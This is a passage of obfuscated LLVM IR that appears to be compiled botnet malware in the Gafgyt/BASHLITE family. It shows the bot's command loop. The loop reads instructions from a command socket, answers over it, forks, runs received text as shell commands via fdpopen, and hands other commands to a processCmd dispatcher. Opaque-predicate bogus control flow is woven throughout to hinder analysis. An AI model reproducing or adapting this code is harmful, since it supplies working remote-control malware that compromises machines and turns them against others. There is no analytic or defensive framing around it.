  store i32 0, i32* %221, align 4
  %222 = load i64, i64* @numpids, align 8
  %223 = add i64 %222, -1
  store i64 %223, i64* @numpids, align 8
  %224 = load i64, i64* @numpids, align 8
  %225 = add i64 %224, 1
  %226 = mul i64 %225, 4
  %227 = call noalias i8* @malloc(i64 %226) #2
  %228 = bitcast i8* %227 to i32*
  store i32* %228, i32** %13, align 8
  store i32 0, i32* %14, align 4
  %229 = load i32, i32* @x.79
  %230 = load i32, i32* @y.80
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBBpart247, label %originalBB26alteredBB

originalBBpart247:                                ; preds = %originalBB26
  br label %237

; <label>:237:                                    ; preds = %268, %originalBBpart247
  %238 = load i32, i32* @x.79
  %239 = load i32, i32* @y.80
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %237
  %246 = load i32, i32* %14, align 4
  %247 = zext i32 %246 to i64
  %248 = load i64, i64* @numpids, align 8
  %249 = icmp ult i64 %247, %248
  %250 = load i32, i32* @x.79
  %251 = load i32, i32* @y.80
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %249, label %258, label %271

; <label>:258:                                    ; preds = %originalBBpart251
  %259 = load i32*, i32** @pids, align 8
  %260 = load i32, i32* %14, align 4
  %261 = zext i32 %260 to i64
  %262 = getelementptr inbounds i32, i32* %259, i64 %261
  %263 = load i32, i32* %262, align 4
  %264 = load i32*, i32** %13, align 8
  %265 = load i32, i32* %14, align 4
  %266 = zext i32 %265 to i64
  %267 = getelementptr inbounds i32, i32* %264, i64 %266
  store i32 %263, i32* %267, align 4
  br label %268

; <label>:268:                                    ; preds = %258
  %269 = load i32, i32* %14, align 4
  %270 = add i32 %269, 1
  store i32 %270, i32* %14, align 4
  br label %237

; <label>:271:                                    ; preds = %originalBBpart251
  %272 = load i32*, i32** @pids, align 8
  %273 = bitcast i32* %272 to i8*
  call void @free(i8* %273) #2
  %274 = load i32*, i32** %13, align 8
  store i32* %274, i32** @pids, align 8
  br label %275

; <label>:275:                                    ; preds = %271, %146
  %276 = load i32, i32* @x.79
  %277 = load i32, i32* @y.80
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %275
  %284 = load i32, i32* @x.79
  %285 = load i32, i32* @y.80
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %292

; <label>:292:                                    ; preds = %originalBBpart255
  %293 = load i32, i32* %12, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %12, align 4
  br label %141

; <label>:295:                                    ; preds = %141
  %296 = load i32, i32* %11, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %297
  store i8 0, i8* %298, align 1
  %299 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %299)
  %300 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %301 = call i8* @strstr(i8* %300, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0)) #10
  %302 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %303 = icmp eq i8* %301, %302
  br i1 %303, label %304, label %323

; <label>:304:                                    ; preds = %295
  %305 = load i32, i32* @x.79
  %306 = load i32, i32* @y.80
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %304
  %313 = load i32, i32* @mainCommSock, align 4
  %314 = call i32 (i32, i8*, ...) @sockprintf(i32 %313, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0))
  %315 = load i32, i32* @x.79
  %316 = load i32, i32* @y.80
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br label %135

; <label>:323:                                    ; preds = %295
  %324 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %325 = call i8* @strstr(i8* %324, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.69, i32 0, i32 0)) #10
  %326 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %327 = icmp eq i8* %325, %326
  br i1 %327, label %328, label %345

; <label>:328:                                    ; preds = %323
  %329 = load i32, i32* @x.79
  %330 = load i32, i32* @y.80
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %328
  call void @exit(i32 0) #14
  %337 = load i32, i32* @x.79
  %338 = load i32, i32* @y.80
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  unreachable

; <label>:345:                                    ; preds = %323
  %346 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %346, i8** %15, align 8
  %347 = load i8*, i8** %15, align 8
  %348 = load i8, i8* %347, align 1
  %349 = zext i8 %348 to i32
  %350 = icmp eq i32 %349, 33
  br i1 %350, label %351, label %786

; <label>:351:                                    ; preds = %345
  %352 = load i8*, i8** %15, align 8
  %353 = getelementptr inbounds i8, i8* %352, i64 1
  store i8* %353, i8** %16, align 8
  br label %354

; <label>:354:                                    ; preds = %382, %351
  %355 = load i32, i32* @x.79
  %356 = load i32, i32* @y.80
  %357 = sub i32 %355, 1
  %358 = mul i32 %355, %357
  %359 = urem i32 %358, 2
  %360 = icmp eq i32 %359, 0
  %361 = icmp slt i32 %356, 10
  %362 = or i1 %360, %361
  br i1 %362, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %354
  %363 = load i8*, i8** %16, align 8
  %364 = load i8, i8* %363, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp ne i32 %365, 32
  %367 = load i32, i32* @x.79
  %368 = load i32, i32* @y.80
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %366, label %375, label %380

; <label>:375:                                    ; preds = %originalBBpart267
  %376 = load i8*, i8** %16, align 8
  %377 = load i8, i8* %376, align 1
  %378 = zext i8 %377 to i32
  %379 = icmp ne i32 %378, 0
  br label %380

; <label>:380:                                    ; preds = %375, %originalBBpart267
  %381 = phi i1 [ false, %originalBBpart267 ], [ %379, %375 ]
  br i1 %381, label %382, label %385

; <label>:382:                                    ; preds = %380
  %383 = load i8*, i8** %16, align 8
  %384 = getelementptr inbounds i8, i8* %383, i32 1
  store i8* %384, i8** %16, align 8
  br label %354

; <label>:385:                                    ; preds = %380
  %386 = load i8*, i8** %16, align 8
  %387 = load i8, i8* %386, align 1
  %388 = zext i8 %387 to i32
  %389 = icmp eq i32 %388, 0
  br i1 %389, label %390, label %407

; <label>:390:                                    ; preds = %385
  %391 = load i32, i32* @x.79
  %392 = load i32, i32* @y.80
  %393 = sub i32 %391, 1
  %394 = mul i32 %391, %393
  %395 = urem i32 %394, 2
  %396 = icmp eq i32 %395, 0
  %397 = icmp slt i32 %392, 10
  %398 = or i1 %396, %397
  br i1 %398, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %390
  %399 = load i32, i32* @x.79
  %400 = load i32, i32* @y.80
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %135

; <label>:407:                                    ; preds = %385
  %408 = load i32, i32* @x.79
  %409 = load i32, i32* @y.80
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %407
  %416 = load i8*, i8** %16, align 8
  store i8 0, i8* %416, align 1
  %417 = load i8*, i8** %15, align 8
  %418 = getelementptr inbounds i8, i8* %417, i64 1
  store i8* %418, i8** %16, align 8
  %419 = load i8*, i8** %15, align 8
  %420 = load i8*, i8** %16, align 8
  %421 = call i64 @strlen(i8* %420) #10
  %422 = getelementptr inbounds i8, i8* %419, i64 %421
  %423 = getelementptr inbounds i8, i8* %422, i64 2
  store i8* %423, i8** %15, align 8
  %424 = load i32, i32* @x.79
  %425 = load i32, i32* @y.80
  %426 = sub i32 %424, 1
  %427 = mul i32 %424, %426
  %428 = urem i32 %427, 2
  %429 = icmp eq i32 %428, 0
  %430 = icmp slt i32 %425, 10
  %431 = or i1 %429, %430
  br i1 %431, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %432

; <label>:432:                                    ; preds = %originalBBpart2108, %originalBBpart275
  %433 = load i32, i32* @x.79
  %434 = load i32, i32* @y.80
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %432
  %441 = load i8*, i8** %15, align 8
  %442 = load i8*, i8** %15, align 8
  %443 = call i64 @strlen(i8* %442) #10
  %444 = sub i64 %443, 1
  %445 = getelementptr inbounds i8, i8* %441, i64 %444
  %446 = load i8, i8* %445, align 1
  %447 = zext i8 %446 to i32
  %448 = icmp eq i32 %447, 10
  %449 = load i32, i32* @x.79
  %450 = load i32, i32* @y.80
  %451 = sub i32 %449, 1
  %452 = mul i32 %449, %451
  %453 = urem i32 %452, 2
  %454 = icmp eq i32 %453, 0
  %455 = icmp slt i32 %450, 10
  %456 = or i1 %454, %455
  br i1 %456, label %originalBBpart288, label %originalBB77alteredBB

originalBBpart288:                                ; preds = %originalBB77
  br i1 %448, label %482, label %457

; <label>:457:                                    ; preds = %originalBBpart288
  %458 = load i32, i32* @x.79
  %459 = load i32, i32* @y.80
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %457
  %466 = load i8*, i8** %15, align 8
  %467 = load i8*, i8** %15, align 8
  %468 = call i64 @strlen(i8* %467) #10
  %469 = sub i64 %468, 1
  %470 = getelementptr inbounds i8, i8* %466, i64 %469
  %471 = load i8, i8* %470, align 1
  %472 = zext i8 %471 to i32
  %473 = icmp eq i32 %472, 13
  %474 = load i32, i32* @x.79
  %475 = load i32, i32* @y.80
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBBpart295, label %originalBB90alteredBB

originalBBpart295:                                ; preds = %originalBB90
  br label %482

; <label>:482:                                    ; preds = %originalBBpart295, %originalBBpart288
  %483 = phi i1 [ true, %originalBBpart288 ], [ %473, %originalBBpart295 ]
  br i1 %483, label %484, label %506

; <label>:484:                                    ; preds = %482
  %485 = load i32, i32* @x.79
  %486 = load i32, i32* @y.80
  %487 = sub i32 %485, 1
  %488 = mul i32 %485, %487
  %489 = urem i32 %488, 2
  %490 = icmp eq i32 %489, 0
  %491 = icmp slt i32 %486, 10
  %492 = or i1 %490, %491
  br i1 %492, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %484
  %493 = load i8*, i8** %15, align 8
  %494 = load i8*, i8** %15, align 8
  %495 = call i64 @strlen(i8* %494) #10
  %496 = sub i64 %495, 1
  %497 = getelementptr inbounds i8, i8* %493, i64 %496
  store i8 0, i8* %497, align 1
  %498 = load i32, i32* @x.79
  %499 = load i32, i32* @y.80
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBBpart2108, label %originalBB97alteredBB

originalBBpart2108:                               ; preds = %originalBB97
  br label %432

; <label>:506:                                    ; preds = %482
  %507 = load i8*, i8** %15, align 8
  store i8* %507, i8** %17, align 8
  br label %508

; <label>:508:                                    ; preds = %originalBBpart2112, %506
  %509 = load i8*, i8** %15, align 8
  %510 = load i8, i8* %509, align 1
  %511 = zext i8 %510 to i32
  %512 = icmp ne i32 %511, 32
  br i1 %512, label %513, label %518

; <label>:513:                                    ; preds = %508
  %514 = load i8*, i8** %15, align 8
  %515 = load i8, i8* %514, align 1
  %516 = zext i8 %515 to i32
  %517 = icmp ne i32 %516, 0
  br label %518

; <label>:518:                                    ; preds = %513, %508
  %519 = phi i1 [ false, %508 ], [ %517, %513 ]
  br i1 %519, label %520, label %539

; <label>:520:                                    ; preds = %518
  %521 = load i32, i32* @x.79
  %522 = load i32, i32* @y.80
  %523 = sub i32 %521, 1
  %524 = mul i32 %521, %523
  %525 = urem i32 %524, 2
  %526 = icmp eq i32 %525, 0
  %527 = icmp slt i32 %522, 10
  %528 = or i1 %526, %527
  br i1 %528, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %520
  %529 = load i8*, i8** %15, align 8
  %530 = getelementptr inbounds i8, i8* %529, i32 1
  store i8* %530, i8** %15, align 8
  %531 = load i32, i32* @x.79
  %532 = load i32, i32* @y.80
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %508

; <label>:539:                                    ; preds = %518
  %540 = load i8*, i8** %15, align 8
  store i8 0, i8* %540, align 1
  %541 = load i8*, i8** %15, align 8
  %542 = getelementptr inbounds i8, i8* %541, i32 1
  store i8* %542, i8** %15, align 8
  %543 = load i8*, i8** %17, align 8
  store i8* %543, i8** %18, align 8
  br label %544

; <label>:544:                                    ; preds = %548, %539
  %545 = load i8*, i8** %18, align 8
  %546 = load i8, i8* %545, align 1
  %547 = icmp ne i8 %546, 0
  br i1 %547, label %548, label %557

; <label>:548:                                    ; preds = %544
  %549 = load i8*, i8** %18, align 8
  %550 = load i8, i8* %549, align 1
  %551 = zext i8 %550 to i32
  %552 = call i32 @toupper(i32 %551) #10
  %553 = trunc i32 %552 to i8
  %554 = load i8*, i8** %18, align 8
  store i8 %553, i8* %554, align 1
  %555 = load i8*, i8** %18, align 8
  %556 = getelementptr inbounds i8, i8* %555, i32 1
  store i8* %556, i8** %18, align 8
  br label %544

; <label>:557:                                    ; preds = %544
  %558 = load i32, i32* @x.79
  %559 = load i32, i32* @y.80
  %560 = sub i32 %558, 1
  %561 = mul i32 %558, %560
  %562 = urem i32 %561, 2
  %563 = icmp eq i32 %562, 0
  %564 = icmp slt i32 %559, 10
  %565 = or i1 %563, %564
  br i1 %565, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %557
  %566 = load i8*, i8** %17, align 8
  %567 = call i32 @strcmp(i8* %566, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.70, i32 0, i32 0)) #10
  %568 = icmp eq i32 %567, 0
  %569 = load i32, i32* @x.79
  %570 = load i32, i32* @y.80
  %571 = sub i32 %569, 1
  %572 = mul i32 %569, %571
  %573 = urem i32 %572, 2
  %574 = icmp eq i32 %573, 0
  %575 = icmp slt i32 %570, 10
  %576 = or i1 %574, %575
  br i1 %576, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %568, label %577, label %648

; <label>:577:                                    ; preds = %originalBBpart2116
  %578 = call i32 @listFork()
  %579 = icmp ne i32 %578, 0
  br i1 %579, label %580, label %597

; <label>:580:                                    ; preds = %577
  %581 = load i32, i32* @x.79
  %582 = load i32, i32* @y.80
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %580
  %589 = load i32, i32* @x.79
  %590 = load i32, i32* @y.80
  %591 = sub i32 %589, 1
  %592 = mul i32 %589, %591
  %593 = urem i32 %592, 2
  %594 = icmp eq i32 %593, 0
  %595 = icmp slt i32 %590, 10
  %596 = or i1 %594, %595
  br i1 %596, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %135

; <label>:597:                                    ; preds = %577
  %598 = load i32, i32* @x.79
  %599 = load i32, i32* @y.80
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %597
  %606 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %606, i8 0, i64 1024, i32 16, i1 false)
  %607 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %608 = load i8*, i8** %15, align 8
  %609 = call i32 (i8*, i8*, ...) @szprintf(i8* %607, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.71, i32 0, i32 0), i8* %608)
  %610 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %611 = call i32 @fdpopen(i8* %610, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.72, i32 0, i32 0))
  store i32 %611, i32* %20, align 4
  %612 = load i32, i32* @x.79
  %613 = load i32, i32* @y.80
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %620

; <label>:620:                                    ; preds = %641, %originalBBpart2124
  %621 = load i32, i32* @x.79
  %622 = load i32, i32* @y.80
  %623 = sub i32 %621, 1
  %624 = mul i32 %621, %623
  %625 = urem i32 %624, 2
  %626 = icmp eq i32 %625, 0
  %627 = icmp slt i32 %622, 10
  %628 = or i1 %626, %627
  br i1 %628, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %620
  %629 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %630 = load i32, i32* %20, align 4
  %631 = call i8* @fdgets(i8* %629, i32 1024, i32 %630)
  %632 = icmp ne i8* %631, null
  %633 = load i32, i32* @x.79
  %634 = load i32, i32* @y.80
  %635 = sub i32 %633, 1
  %636 = mul i32 %633, %635
  %637 = urem i32 %636, 2
  %638 = icmp eq i32 %637, 0
  %639 = icmp slt i32 %634, 10
  %640 = or i1 %638, %639
  br i1 %640, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %632, label %641, label %645

; <label>:641:                                    ; preds = %originalBBpart2128
  %642 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %642)
  %643 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %643, i8 0, i64 1024, i32 16, i1 false)
  %644 = call i32 @sleep(i32 1)
  br label %620

; <label>:645:                                    ; preds = %originalBBpart2128
  %646 = load i32, i32* %20, align 4
  %647 = call i32 @fdpclose(i32 %646)
  call void @exit(i32 0) #14
  unreachable

; <label>:648:                                    ; preds = %originalBBpart2116
  %649 = load i32, i32* @x.79
  %650 = load i32, i32* @y.80
  %651 = sub i32 %649, 1
  %652 = mul i32 %649, %651
  %653 = urem i32 %652, 2
  %654 = icmp eq i32 %653, 0
  %655 = icmp slt i32 %650, 10
  %656 = or i1 %654, %655
  br i1 %656, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %648
  store i32 1, i32* %22, align 4
  %657 = load i8*, i8** %15, align 8
  %658 = call i8* @strtok(i8* %657, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0)) #2
  store i8* %658, i8** %23, align 8
  %659 = load i8*, i8** %17, align 8
  %660 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %659, i8** %660, align 16
  %661 = load i32, i32* @x.79
  %662 = load i32, i32* @y.80
  %663 = sub i32 %661, 1
  %664 = mul i32 %661, %663
  %665 = urem i32 %664, 2
  %666 = icmp eq i32 %665, 0
  %667 = icmp slt i32 %662, 10
  %668 = or i1 %666, %667
  br i1 %668, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %669

; <label>:669:                                    ; preds = %716, %originalBBpart2132
  %670 = load i8*, i8** %23, align 8
  %671 = icmp ne i8* %670, null
  br i1 %671, label %672, label %718

; <label>:672:                                    ; preds = %669
  %673 = load i8*, i8** %23, align 8
  %674 = load i8, i8* %673, align 1
  %675 = zext i8 %674 to i32
  %676 = icmp ne i32 %675, 10
  br i1 %676, label %677, label %716

; <label>:677:                                    ; preds = %672
  %678 = load i32, i32* @x.79
  %679 = load i32, i32* @y.80
  %680 = sub i32 %678, 1
  %681 = mul i32 %678, %680
  %682 = urem i32 %681, 2
  %683 = icmp eq i32 %682, 0
  %684 = icmp slt i32 %679, 10
  %685 = or i1 %683, %684
  br i1 %685, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %677
  %686 = load i8*, i8** %23, align 8
  %687 = call i64 @strlen(i8* %686) #10
  %688 = add i64 %687, 1
  %689 = call noalias i8* @malloc(i64 %688) #2
  %690 = load i32, i32* %22, align 4
  %691 = sext i32 %690 to i64
  %692 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %691
  store i8* %689, i8** %692, align 8
  %693 = load i32, i32* %22, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %694
  %696 = load i8*, i8** %695, align 8
  %697 = load i8*, i8** %23, align 8
  %698 = call i64 @strlen(i8* %697) #10
  %699 = add i64 %698, 1
  call void @llvm.memset.p0i8.i64(i8* %696, i8 0, i64 %699, i32 1, i1 false)
  %700 = load i32, i32* %22, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %701
  %703 = load i8*, i8** %702, align 8
  %704 = load i8*, i8** %23, align 8
  %705 = call i8* @strcpy(i8* %703, i8* %704) #2
  %706 = load i32, i32* %22, align 4
  %707 = add nsw i32 %706, 1
  store i32 %707, i32* %22, align 4
  %708 = load i32, i32* @x.79
  %709 = load i32, i32* @y.80
  %710 = sub i32 %708, 1
  %711 = mul i32 %708, %710
  %712 = urem i32 %711, 2
  %713 = icmp eq i32 %712, 0
  %714 = icmp slt i32 %709, 10
  %715 = or i1 %713, %714
  br i1 %715, label %originalBBpart2153, label %originalBB134alteredBB

originalBBpart2153:                               ; preds = %originalBB134
  br label %716

; <label>:716:                                    ; preds = %originalBBpart2153, %672
  %717 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0)) #2
  store i8* %717, i8** %23, align 8
  br label %669

; <label>:718:                                    ; preds = %669
  %719 = load i32, i32* %22, align 4
  %720 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %719, i8** %720)
  %721 = load i32, i32* %22, align 4
  %722 = icmp sgt i32 %721, 1
  br i1 %722, label %723, label %785

; <label>:723:                                    ; preds = %718
  %724 = load i32, i32* @x.79
  %725 = load i32, i32* @y.80
  %726 = sub i32 %724, 1
  %727 = mul i32 %724, %726
  %728 = urem i32 %727, 2
  %729 = icmp eq i32 %728, 0
  %730 = icmp slt i32 %725, 10
  %731 = or i1 %729, %730
  br i1 %731, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %723
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  %732 = load i32, i32* @x.79
  %733 = load i32, i32* @y.80
  %734 = sub i32 %732, 1
  %735 = mul i32 %732, %734
  %736 = urem i32 %735, 2
  %737 = icmp eq i32 %736, 0
  %738 = icmp slt i32 %733, 10
  %739 = or i1 %737, %738
  br i1 %739, label %originalBBpart2157, label %originalBB155alteredBB

originalBBpart2157:                               ; preds = %originalBB155
  br label %740

; <label>:740:                                    ; preds = %765, %originalBBpart2157
  %741 = load i32, i32* @x.79
  %742 = load i32, i32* @y.80
  %743 = sub i32 %741, 1
  %744 = mul i32 %741, %743
  %745 = urem i32 %744, 2
  %746 = icmp eq i32 %745, 0
  %747 = icmp slt i32 %742, 10
  %748 = or i1 %746, %747
  br i1 %748, label %originalBB159, label %originalBB159alteredBB

originalBB159:                                    ; preds = %originalBB159alteredBB, %740
  %749 = load i32, i32* %24, align 4
  %750 = load i32, i32* %22, align 4
  %751 = icmp slt i32 %749, %750
  %752 = load i32, i32* @x.79
  %753 = load i32, i32* @y.80
  %754 = sub i32 %752, 1
  %755 = mul i32 %752, %754
  %756 = urem i32 %755, 2
  %757 = icmp eq i32 %756, 0
  %758 = icmp slt i32 %753, 10
  %759 = or i1 %757, %758
  br i1 %759, label %originalBBpart2161, label %originalBB159alteredBB

originalBBpart2161:                               ; preds = %originalBB159
  br i1 %751, label %760, label %768

; <label>:760:                                    ; preds = %originalBBpart2161
  %761 = load i32, i32* %24, align 4
  %762 = sext i32 %761 to i64
  %763 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %762
  %764 = load i8*, i8** %763, align 8
  call void @free(i8* %764) #2
  br label %765

; <label>:765:                                    ; preds = %760
  %766 = load i32, i32* %24, align 4
  %767 = add nsw i32 %766, 1
  store i32 %767, i32* %24, align 4
  br label %740

; <label>:768:                                    ; preds = %originalBBpart2161
  %769 = load i32, i32* @x.79
  %770 = load i32, i32* @y.80
  %771 = sub i32 %769, 1
  %772 = mul i32 %769, %771
  %773 = urem i32 %772, 2
  %774 = icmp eq i32 %773, 0
  %775 = icmp slt i32 %770, 10
  %776 = or i1 %774, %775
  br i1 %776, label %originalBB163, label %originalBB163alteredBB

originalBB163:                                    ; preds = %originalBB163alteredBB, %768
  %777 = load i32, i32* @x.79
  %778 = load i32, i32* @y.80
  %779 = sub i32 %777, 1
  %780 = mul i32 %777, %779
  %781 = urem i32 %780, 2
  %782 = icmp eq i32 %781, 0
  %783 = icmp slt i32 %778, 10
  %784 = or i1 %782, %783
  br i1 %784, label %originalBBpart2165, label %originalBB163alteredBB

originalBBpart2165:                               ; preds = %originalBB163
  br label %785

; <label>:785:                                    ; preds = %originalBBpart2165, %718
  br label %786

; <label>:786:                                    ; preds = %785, %345
  br label %135

; <label>:787:                                    ; preds = %135
